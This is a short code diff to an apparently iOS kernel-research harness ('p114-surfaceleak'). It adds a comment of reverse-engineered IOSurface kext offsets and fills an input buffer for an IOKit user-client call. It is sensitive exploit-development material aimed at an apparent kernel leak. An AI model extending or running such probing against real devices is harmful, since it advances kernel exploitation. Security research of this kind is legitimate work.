@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.3"
+#define P114_BUILD @"p114-surfaceleak-v1.4"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -237,6 +237,19 @@ static void p114_hexdump(size_t maxn) {
            23F77 0x8a31f58/0xa31f64, 24A435 0x909b2f8/0xb304. Tonight's device
            2c2 (outLen=4008 echoed) = exactly this bit absent. */
         qBuf[0xFA4] = 0x01;
+        /* v1.4 PHASE LAW (byte-verified 24A435 0x909b2e8-family, 2026-10-27):
+           the 4-phase builder's phases 1..3 each require in[0] > 1 (else
+           2bd+5 = 2c2) and pass (count=2, in+4) to the shared factory
+           (0x908f9d4) which instantiates TWO objects per phase via the
+           IOSurface-kext create stub (GOT 0x81153e0 -> 0xa344130 on
+           24A435). Phase 0 (0x908f5ec) reads in[0] itself (0x908f664) and
+           walks u32 tags post-increment (0x908f6cc [x1],#4). So in[0] =
+           the object count, legal window (front gate <= 0x3e8 AND phases
+           > 1) -> 2. Tags at in[4]/in[8] = the factory params (tagn 0 =
+           first device probe value; the factory's own enum decides). */
+        *(uint32_t *)(void *)qBuf = 0x2;          /* word0 = count 2        */
+        *(uint32_t *)(void *)(qBuf + 4) = 0x0;    /* tag1 (factory param)   */
+        *(uint32_t *)(void *)(qBuf + 8) = 0x0;    /* tag2 (factory param)   */
         size_t qOutLen = sizeof(qBuf);
         uint64_t qOut[4] = {0};
         kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, qOut, &qOutLen);
